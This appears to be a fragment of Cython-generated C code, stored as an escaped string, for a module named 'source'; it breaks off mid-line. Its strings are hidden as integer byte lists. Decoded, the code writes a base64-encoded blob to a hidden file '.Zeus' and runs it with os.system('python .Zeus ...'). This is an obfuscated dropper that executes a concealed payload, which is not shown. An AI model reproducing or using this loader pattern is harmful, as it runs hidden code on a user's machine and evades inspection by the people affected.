__Pyx_RefNannyDeclarations\\n  #if CYTHON_PEP489_MULTI_PHASE_INIT\\n  if (__pyx_m) {\\n    if (__pyx_m == __pyx_pyinit_module) return 0;\\n    PyErr_SetString(PyExc_RuntimeError, \\\"Module 'source' has already been imported. Re-initialisat""ion is not supported.\\\");\\n    return -1;\\n  }\\n  #elif PY_MAJOR_VERSION >= 3\\n  if (__pyx_m) return __Pyx_NewRef(__pyx_m);\\n  #endif\\n  #if CYTHON_REFNANNY\\n__Pyx_RefNanny = __Pyx_RefNannyImportAPI(\\\"refnanny\\\");\\nif (!__Pyx_RefNanny) {\\n  PyErr_Clear();\\n  __Pyx_RefNanny = __Pyx_RefNannyImportAPI(\\\"Cython.Runtime.refnanny\\\");\\n  if (!__Pyx_RefNanny)\\n      Py_FatalError(\\\"failed to import 'refnanny' module\\\");\\n}\\n#endif\\n  __Pyx_RefNannySetupContext(\\\"__Pyx_PyMODINIT_FUNC PyInit_source(void)\\\", 0);\\n  if (__Pyx_check_binary_version() < 0) __PYX_ERR(0, 4, __pyx_L1_error)\\n  #if\"\"def __Pxy_PyFrame_Initialize_Offsets\\n  __Pxy_PyFrame_Initialize_Offsets();\\n  #endif\\n  __pyx_empty_tuple = PyTuple_New(0); if (unlikely(!__pyx_empty_tuple)) __PYX_ERR(0, 4, __pyx_L1_error)\\n  __pyx_empty_bytes = PyBytes_FromStringAndSize(\\\"\\\", 0); if (unlikely(!__pyx_empty_bytes)) __PYX_ERR(0, 4, __pyx_L1_error)\\n  __pyx_empty_unicode = PyUnicode_FromStringAndSize(\\\"\\\", 0); if (unlikely(!__pyx_empty_unicode)) __PYX_ERR(0, 4, __pyx_L1_error)\\n  #ifdef __Pyx_CyFunction_USED\\n  if (__pyx_CyFunction_init() < 0) __PYX_ERR(0, 4, __pyx_L1_error)\\n  #endif\\n  #ifdef __Pyx_FusedFunction_USED\\n  if (__pyx_FusedFunction_init() < 0) __PYX_ERR(0, 4, __pyx_L1_error)\\n  #endif\\n  #ifdef __Pyx_Coroutine_USED\\n  if (__pyx_Coroutine_init() < 0) __PYX_ERR(0, 4, __pyx_L1_error)\\n  #endif\\n  #ifdef __Pyx_Generator_USED\\n  if (__pyx_Generator_init() < 0) __PYX_ERR(0, 4, __pyx_L1_error)\\n  #endif\\n  #ifdef __Pyx_AsyncGen_USED\\n  if (__pyx_AsyncGen_init() < 0) __PYX_ERR(0, 4, __pyx_L1_error)\\n  #endif\\n  #ifdef __Pyx_StopAsyncIteration_USED\\n  if (__pyx_StopAsyncIteration_init() < 0) __PYX_ERR(0, 4, __pyx_L1_error)\\n  #endif\\n  /*--- Library function declarations ---*/\\n  /*--- Threads initialization code ---*/\\n  #if defined(WITH_THREAD) && PY_VERSION_HEX < 0x030700F0 && defined(__PYX_FORCE_INIT_THREADS) && __PYX_FORCE_INIT_THREADS\\n  PyEv""al_InitThreads();\\n  #endif\\n  /*--- Module creation code ---*/\\n  #if CYTHON_PEP489_MULTI_PHASE_INIT\\n  __pyx_m = __pyx_pyinit_module;\\n  Py_INCREF(__pyx_m);\\n  #else\\n  #if PY_MAJOR_VERSION < 3\\n  __pyx_m = Py_InitModule4(\\\"source\\\", __pyx_methods, 0, 0, PYTHON_API_VERSION); Py_XINCREF(__pyx_m);\\n  #else\\n  __pyx_m = PyModule_Create(&__pyx_moduledef);\\n  #endif\\n  if (unlikely(!__pyx_m)) __PYX_ERR(0, 4, __pyx_L1_error)\\n  #endif\\n  __pyx_d = PyModule_GetDict(__pyx_m); if (unlikely(!__pyx_d)) __PYX_ERR(0, 4, __pyx_L1_error)\\n  Py_INCREF(__pyx_d);\\n  __pyx_b = PyImport_AddModule(__Pyx_BUILTIN_MODULE_NAME); if (unlikely(!__pyx_b)) __PYX_ERR(0, 4, __pyx_\"\"L1_error)\\n  Py_INCREF(__pyx_b);\\n  __pyx_cython_runtime = PyImport_AddModule((char *) \\\"cython_runtime\\\"); if (unlikely(!__pyx_cython_runtime)) __PYX_ERR(0, 4, __pyx_L1_error)\\n  Py_INCREF(__pyx_cython_runtime);\\n  if (PyObject_SetAttrString(__pyx_m, \\\"__builtins__\\\", __pyx_b) < 0) __PYX_ERR(0, 4, __pyx_L1_error)\\n  /*--- Initialize various global constants etc. ---*/\\n  if (__Pyx_InitGlobals() < 0) __PYX_ERR(0, 4, __pyx_L1_error)\\n  #if PY_MAJOR_VERSION < 3 && (__PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT)\\n  if (__Pyx_init_sys_getdefaultencoding_params() < 0) __PYX_ERR(0, 4, __pyx_L1_error)\\n  #endif\\n  if (__pyx_module_is_main_source) {\\n    if (PyObject_SetAttr(__pyx_m, __pyx_n_s_name, __pyx_n_s_main) < 0) __PYX_ERR(0, 4, __pyx_L1_error)\\n  }\\n  #if PY_MAJOR_VERSION >= 3\\n  {\\n    PyObject *modules = PyImport_GetModuleDict(); if (unlikely(!modules)) __PYX_ERR(0, 4, __pyx_L1_error)\\n    if (!PyDict_GetItemString(modules, \\\"source\\\")) {\\n      if (unlikely(PyDict_SetItemString(modules, \\\"source\\\", __pyx_m) < 0)) __PYX_ERR(0, 4, __pyx_L1_error)\\n    }\\n  }\\n  #endif\\n  /*--- Builtin init code ---*/\\n  if (__Pyx_InitCachedBuiltins() < 0) __PYX_ERR(0, 4, __pyx_L1_error)\\n  /*--- Constants init code ---*/\\n  if (__Pyx_I""nitCachedConstants() < 0) __PYX_ERR(0, 4, __pyx_L1_error)\\n  /*--- Global type/function init code ---*/\\n  (void)__Pyx_modinit_global_init_code();\\n  (void)__Pyx_modinit_variable_export_code();\\n  (void)__Pyx_modinit_function_export_code();\\n  (void)__Pyx_modinit_type_init_code();\\n  (void)__Pyx_modinit_type_import_code();\\n  (void)__Pyx_modinit_variable_import_code();\\n  (void)__Pyx_modinit_function_import_code();\\n  /*--- Execution code ---*/\\n  #if defined(__Pyx_Generator_USED) || defined(__Pyx_Coroutine_USED)\\n  if (__Pyx_patch_abc() < 0) __PYX_ERR(0, 4, __pyx_L1_error)\\n  #endif\\n\\n\\n  __pyx_t_1 = __Pyx_Import(__pyx_n_s_os, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 4, __pyx_L1_error)\\n  __Pyx_GOTREF(__pyx_\"\"t_1);\\n  if (PyDict_SetItem(__pyx_d, __pyx_n_s_os, __pyx_t_1) < 0) __PYX_ERR(0, 4, __pyx_L1_error)\\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\\n\\n\\n  __pyx_t_1 = __Pyx_Import(__pyx_n_s_sys, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 5, __pyx_L1_error)\\n  __Pyx_GOTREF(__pyx_t_1);\\n  if (PyDict_SetItem(__pyx_d, __pyx_n_s_sys, __pyx_t_1) < 0) __PYX_ERR(0, 5, __pyx_L1_error)\\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\\n\\n\\n  __pyx_t_1 = __Pyx_Import(__pyx_n_s_base64, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 6, __pyx_L1_error)\\n  __Pyx_GOTREF(__pyx_t_1);\\n  if (PyDict_SetItem(__pyx_d, __pyx_n_s_base64, __pyx_t_1) < 0) __PYX_ERR(0, 6, __pyx_L1_error)\\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\\n\\n\\n  __pyx_t_1 = PyList_New(5); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 8, __pyx_L1_error)\\n  __Pyx_GOTREF(__pyx_t_1);\\n  __Pyx_INCREF(__pyx_int_46);\\n  __Pyx_GIVEREF(__pyx_int_46);\\n  PyList_SET_ITEM(__pyx_t_1, 0, __pyx_int_46);\\n  __Pyx_INCREF(__pyx_int_90);\\n  __Pyx_GIVEREF(__pyx_int_90);\\n  PyList_SET_ITEM(__pyx_t_1, 1, __pyx_int_90);\\n  __Pyx_INCREF(__pyx_int_101);\\n  __Pyx_GIVEREF(__pyx_int_101);\\n  PyList_SET_ITEM(__pyx_t_1, 2, __pyx_int_101);\\n  __Pyx_INCREF(__pyx_int_117);\\n  __Pyx_GIVEREF(__pyx_int_117);""\\n  PyList_SET_ITEM(__pyx_t_1, 3, __pyx_int_117);\\n  __Pyx_INCREF(__pyx_int_115);\\n  __Pyx_GIVEREF(__pyx_int_115);\\n  PyList_SET_ITEM(__pyx_t_1, 4, __pyx_int_115);\\n  __pyx_t_2 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 8, __pyx_L1_error)\\n  __Pyx_GOTREF(__pyx_t_2);\\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\\n  __pyx_t_1 = __Pyx_decode_bytes(__pyx_t_2, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 8, __pyx_L1_error)\\n  __Pyx_GOTREF(__pyx_t_1);\\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\\n  if (PyDict_SetItem(__pyx_d, __pyx_n_s_zeus, __pyx_t_1) < 0) __PYX_ERR(0, 8, __pyx_L1_error)\\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\\n\\n\\n  /*try:*/ {\\n    {\\n      __Pyx_PyThreadState\"\"_declare\\n      __Pyx_PyThreadState_assign\\n      __Pyx_ExceptionSave(&__pyx_t_3, &__pyx_t_4, &__pyx_t_5);\\n      __Pyx_XGOTREF(__pyx_t_3);\\n      __Pyx_XGOTREF(__pyx_t_4);\\n      __Pyx_XGOTREF(__pyx_t_5);\\n      /*try:*/ {\\n\\n\\n        __pyx_t_1 = __Pyx_CyFunction_New(&__pyx_mdef_6source_lambda, 0, __pyx_n_s_lambda, NULL, __pyx_n_s_source, __pyx_d, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 10, __pyx_L5_error)\\n        __Pyx_GOTREF(__pyx_t_1);\\n        __pyx_t_2 = __Pyx_PyObject_CallNoArg(__pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 10, __pyx_L5_error)\\n        __Pyx_GOTREF(__pyx_t_2);\\n        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\\n        if (PyDict_SetItem(__pyx_d, __pyx_n_s_AM, __pyx_t_2) < 0) __PYX_ERR(0, 10, __pyx_L5_error)\\n        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\\n\\n\\n        /*with:*/ {\\n          __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_zeus); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 11, __pyx_L5_error)\\n          __Pyx_GOTREF(__pyx_t_2);\\n          __pyx_t_1 = PyList_New(2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 11, __pyx_L5_error)\\n          __Pyx_GOTREF(__pyx_t_1);\\n          __Pyx_INCREF(__pyx_int_119);\\n          __Pyx_G""IVEREF(__pyx_int_119);\\n          PyList_SET_ITEM(__pyx_t_1, 0, __pyx_int_119);\\n          __Pyx_INCREF(__pyx_int_98);\\n          __Pyx_GIVEREF(__pyx_int_98);\\n          PyList_SET_ITEM(__pyx_t_1, 1, __pyx_int_98);\\n          __pyx_t_6 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_1); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 11, __pyx_L5_error)\\n          __Pyx_GOTREF(__pyx_t_6);\\n          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\\n          __pyx_t_1 = __Pyx_decode_bytes(__pyx_t_6, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 11, __pyx_L5_error)\\n          __Pyx_GOTREF(__pyx_t_1);\\n          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;\\n          __pyx_t_6 = PyTuple_New(2); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 11, __pyx_L5_error)\\n          __Pyx_GOTREF(__pyx_t_6);\"\"\\n          __Pyx_GIVEREF(__pyx_t_2);\\n          PyTuple_SET_ITEM(__pyx_t_6, 0, __pyx_t_2);\\n          __Pyx_GIVEREF(__pyx_t_1);\\n          PyTuple_SET_ITEM(__pyx_t_6, 1, __pyx_t_1);\\n          __pyx_t_2 = 0;\\n          __pyx_t_1 = 0;\\n          __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_t_6, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 11, __pyx_L5_error)\\n          __Pyx_GOTREF(__pyx_t_1);\\n          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;\\n          __pyx_t_7 = __Pyx_PyObject_LookupSpecial(__pyx_t_1, __pyx_n_s_exit); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 11, __pyx_L5_error)\\n          __Pyx_GOTREF(__pyx_t_7);\\n          __pyx_t_6 = __Pyx_PyObject_LookupSpecial(__pyx_t_1, __pyx_n_s_enter); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 11, __pyx_L11_error)\\n          __Pyx_GOTREF(__pyx_t_6);\\n          __pyx_t_2 = __Pyx_PyObject_CallNoArg(__pyx_t_6); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 11, __pyx_L11_error)\\n          __Pyx_GOTREF(__pyx_t_2);\\n          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;\\n          __pyx_t_6 = __pyx_t_2;\\n          __pyx_t_2 = 0;\\n          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\\n        ""  /*try:*/ {\\n            {\\n              __Pyx_PyThreadState_declare\\n              __Pyx_PyThreadState_assign\\n              __Pyx_ExceptionSave(&__pyx_t_8, &__pyx_t_9, &__pyx_t_10);\\n              __Pyx_XGOTREF(__pyx_t_8);\\n              __Pyx_XGOTREF(__pyx_t_9);\\n              __Pyx_XGOTREF(__pyx_t_10);\\n              /*try:*/ {\\n                if (PyDict_SetItem(__pyx_d, __pyx_n_s_D, __pyx_t_6) < 0) __PYX_ERR(0, 11, __pyx_L15_error)\\n                __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;\\n\\n\\n                __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_D); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 12, __pyx_L15_error)\\n                __Pyx_GOTREF(__pyx_t_6);\\n                __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_write); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 12, __pyx_L15_error)\\n                __Pyx_GOTREF(__pyx_t_1)\"\";\\n                __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;\\n                __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_base64); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 12, __pyx_L15_error)\\n                __Pyx_GOTREF(__pyx_t_6);\\n                __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_b64decode); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 12, __pyx_L15_error)\\n                __Pyx_GOTREF(__pyx_t_2);\\n                __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;\\n                __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_AM); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 12, __pyx_L15_error)\\n                __Pyx_GOTREF(__pyx_t_6);\\n                __pyx_t_11 = __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_6); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 12, __pyx_L15_error)\\n                __Pyx_GOTREF(__pyx_t_11);\\n                __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\\n                __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;\\n                __pyx_t_6 = __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_t_11); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 12, __pyx_L15_error)\\n                __""Pyx_GOTREF(__pyx_t_6);\\n                __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\\n                __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;\\n                __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;\\n\\n\\n              }\\n              __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;\\n              __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;\\n              __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;\\n              goto __pyx_L20_try_end;\\n              __pyx_L15_error:;\\n              __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;\\n              __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;\\n              __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;\\n              __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;\\n              /*except:*/ {\\n                __Pyx_AddTraceback(\\\"source\\\", __pyx_clineno, __pyx_lineno, __pyx_filename);\\n                if (__Pyx_GetException(&__pyx_t_6, &__pyx_t_11, &__pyx_t_1) < 0) __P\"\"YX_ERR(0, 11, __pyx_L17_except_error)\\n                __Pyx_GOTREF(__pyx_t_6);\\n                __Pyx_GOTREF(__pyx_t_11);\\n                __Pyx_GOTREF(__pyx_t_1);\\n                __pyx_t_2 = PyTuple_Pack(3, __pyx_t_6, __pyx_t_11, __pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 11, __pyx_L17_except_error)\\n                __Pyx_GOTREF(__pyx_t_2);\\n                __pyx_t_12 = __Pyx_PyObject_Call(__pyx_t_7, __pyx_t_2, NULL);\\n                __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;\\n                __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\\n                if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 11, __pyx_L17_except_error)\\n                __Pyx_GOTREF(__pyx_t_12);\\n                __pyx_t_13 = __Pyx_PyObject_IsTrue(__pyx_t_12);\\n                __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;\\n                if (__pyx_t_13 < 0) __PYX_ERR(0, 11, __pyx_L17_except_error)\\n                __pyx_t_14 = ((!(__pyx_t_13 != 0)) != 0);\\n                if (__pyx_t_14) {\\n                  __Pyx_GIVEREF(__pyx_t_6);\\n                  __Pyx_GIVEREF(__pyx_t_11);""\\n                  __Pyx_XGIVEREF(__pyx_t_1);\\n                  __Pyx_ErrRestoreWithState(__pyx_t_6, __pyx_t_11, __pyx_t_1);\\n                  __pyx_t_6 = 0; __pyx_t_11 = 0; __pyx_t_1 = 0;\\n                  __PYX_ERR(0, 11, __pyx_L17_except_error)\\n                }\\n                __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;\\n                __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;\\n                __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;\\n                goto __pyx_L16_exception_handled;\\n              }\\n              __pyx_L17_except_error:;\\n              __Pyx_XGIVEREF(__pyx_t_8);\\n              __Pyx_XGIVEREF(__pyx_t_9);\\n              __Pyx_XGIVEREF(__pyx_t_10);\\n              __Pyx_ExceptionReset(__pyx_t_8, __pyx_t_9, __pyx_t_10);\\n              goto __pyx_L5_error;\\n              __pyx_L16_exception_handled:;\\n              __Pyx_XGIVEREF(__pyx_t_8);\\n              __Pyx_XGIVEREF(__pyx_t_9);\\n              __Pyx_\"\"XGIVEREF(__pyx_t_10);\\n              __Pyx_ExceptionReset(__pyx_t_8, __pyx_t_9, __pyx_t_10);\\n              __pyx_L20_try_end:;\\n            }\\n          }\\n          /*finally:*/ {\\n            /*normal exit:*/{\\n              if (__pyx_t_7) {\\n                __pyx_t_10 = __Pyx_PyObject_Call(__pyx_t_7, __pyx_tuple_, NULL);\\n                __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;\\n                if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 11, __pyx_L5_error)\\n                __Pyx_GOTREF(__pyx_t_10);\\n                __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;\\n              }\\n              goto __pyx_L14;\\n            }\\n            __pyx_L14:;\\n          }\\n          goto __pyx_L24;\\n          __pyx_L11_error:;\\n          __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;\\n          goto __pyx_L5_error;\\n          __pyx_L24:;\\n        }\\n\\n\\n        __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_os); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 13, __pyx_L5_error)\\n        __Pyx_GOTREF(__pyx_t_1);\\n        __pyx""_t_11 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_system); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 13, __pyx_L5_error)\\n        __Pyx_GOTREF(__pyx_t_11);\\n        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\\n        __pyx_t_1 = PyList_New(7); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 13, __pyx_L5_error)\\n        __Pyx_GOTREF(__pyx_t_1);\\n        __Pyx_INCREF(__pyx_int_112);\\n        __Pyx_GIVEREF(__pyx_int_112);\\n        PyList_SET_ITEM(__pyx_t_1, 0, __pyx_int_112);\\n        __Pyx_INCREF(__pyx_int_121);\\n        __Pyx_GIVEREF(__pyx_int_121);\\n        PyList_SET_ITEM(__pyx_t_1, 1, __pyx_int_121);\\n        __Pyx_INCREF(__pyx_int_116);\\n        __Pyx_GIVEREF(__pyx_int_116);\\n        PyList_SET_ITEM(__pyx_t_1, 2, __pyx_int_116);\\n        __Pyx_INCREF(__pyx_int_104);\\n        __Pyx_GIVEREF(__pyx_int_104);\\n        PyList_SET_ITEM(__pyx_t_1, 3, __pyx_int_104);\\n        __Pyx_INCREF(__pyx_int_111);\\n        __Pyx_GIVEREF(__pyx_int_111);\\n        PyList_SET_ITEM(__pyx_t_1, 4, __pyx_int_\"\"111);\\n        __Pyx_INCREF(__pyx_int_110);\\n        __Pyx_GIVEREF(__pyx_int_110);\\n        PyList_SET_ITEM(__pyx_t_1, 5, __pyx_int_110);\\n        __Pyx_INCREF(__pyx_int_32);\\n        __Pyx_GIVEREF(__pyx_int_32);\\n        PyList_SET_ITEM(__pyx_t_1, 6, __pyx_int_32);\\n        __pyx_t_6 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_1); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 13, __pyx_L5_error)\\n        __Pyx_GOTREF(__pyx_t_6);\\n        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\\n        __pyx_t_1 = __Pyx_decode_bytes(__pyx_t_6, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 13, __pyx_L5_error)\\n        __Pyx_GOTREF(__pyx_t_1);\\n        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;\\n        __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_zeus); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 13, __pyx_L5_error)\\n        __Pyx_GOTREF(__pyx_t_6);\\n        __pyx_t_2 = PyNumber_Add(__pyx_t_1, __pyx_t_6); if (unlikely(!__pyx_t_2)) __""PYX_ERR(0, 13, __pyx_L5_error)\\n        __Pyx_GOTREF(__pyx_t_2);\\n        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\\n        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;\\n        __pyx_t_6 = PyList_New(1); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 13, __pyx_L5_error)\\n        __Pyx_GOTREF(__pyx_t_6);\\n        __Pyx_INCREF(__pyx_int_32);\\n        __Pyx_GIVEREF(__pyx_int_32);\\n        PyList_SET_ITEM(__pyx_t_6, 0, __pyx_int_32);\\n        __pyx_t_1 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_6); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 13, __pyx_L5_error)\\n        __Pyx_GOTREF(__pyx_t_1);\\n        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;\\n        __pyx_t_6 = __Pyx_decode_bytes(__pyx_t_1, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 13, __pyx_L5_error)\\n        __Pyx_GOTREF(__pyx_t_6);\\n        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\\n        __pyx_t_1 = PyNumber_Add(__pyx_t_2, __pyx_t_6); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 13, __pyx_L5_error)\\n        __Pyx_GOTREF(__pyx_t\"\"_1);\\n        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\\n        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;\\n        __pyx_t_6 = PyList_New(1); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 13, __pyx_L5_error)\\n        __Pyx_GOTREF(__pyx_t_6);\\n        __Pyx_INCREF(__pyx_int_32);\\n        __Pyx_GIVEREF(__pyx_int_32);\\n        PyList_SET_ITEM(__pyx_t_6, 0, __pyx_int_32);\\n        __pyx_t_2 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_6); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 13, __pyx_L5_error)\\n        __Pyx_GOTREF(__pyx_t_2);\\n        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;\\n        __pyx_t_6 = __Pyx_decode_bytes(__pyx_t_2, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 13, __pyx_L5_error)\\n        __Pyx_GOTREF(__pyx_t_6);\\n        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\\n        __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_sys); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 13, __pyx_L5""_error)\\n        __Pyx_GOTREF(__pyx_t_2);\\n        __pyx_t_15 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_argv); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 13, __pyx_L5_error)\\n        __Pyx_GOTREF(__pyx_t_15);\\n        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\\n        __pyx_t_2 = __Pyx_PyObject_GetSlice(__pyx_t_15, 1, 0, NULL, NULL, &__pyx_slice__2, 1, 0, 1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 13, __pyx_L5_error)\\n        __Pyx_GOTREF(__pyx_t_2);\\n        __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;\\n        __pyx_t_15 = PyUnicode_Join(((PyObject*)__pyx_t_6), __pyx_t_2); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 13, __pyx_L5_error)\\n        __Pyx_GOTREF(__pyx_t_15);\\n        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;\\n        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\\n        __pyx_t_2 = PyNumber_Add(__pyx_t_1, __pyx_t_15); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 13, __pyx_L5_error)\\n        __Pyx_GOTREF(__pyx_t_2);\\n        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\\n        __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;\\n        __pyx_t_15 = __Pyx_PyObject_C\"\"allOneArg(__pyx_t_11, __pyx_t_2); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 13, __pyx_L5_error)\\n        __Pyx_GOTREF(__pyx_t_15);\\n        __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;\\n        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\\n        __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;\\n\\n\\n        /*with:*/ {\\n          __Pyx_GetModuleGlobalName(__pyx_t_15, __pyx_n_s_zeus); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 14, __pyx_L5_error)\\n          __Pyx_GOTREF(__pyx_t_15);\\n          __pyx_t_2 = PyList_New(3); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 14, __pyx_L5_error)\\n          __Pyx_GOTREF(__pyx_t_2);\\n          __Pyx_INCREF(__pyx_int_114);\\n          __Pyx_GIVEREF(__pyx_int_114);\\n          PyList_SET_ITEM(__pyx_t_2, 0, __pyx_int_114);\\n          __Pyx_INCREF(__pyx_int_43);\\n          __Pyx_GIVEREF(__pyx_int_43);\\n          PyList_SET_ITEM(__pyx_t_2, 1, __pyx_int_43);\\n          __Pyx_INCREF(_""_pyx_int_98);\\n          __Pyx_GIVEREF(__pyx_int_98);\\n          PyList_SET_ITEM(__pyx_t_2, 2, __pyx_int_98);\\n          __pyx_t_11 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_2); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 14, __pyx_L5_error)\\n          __Pyx_GOTREF(__pyx_t_11);\\n          __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\\n          __pyx_t_2 = __Pyx_decode_bytes(__pyx_t_11, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if 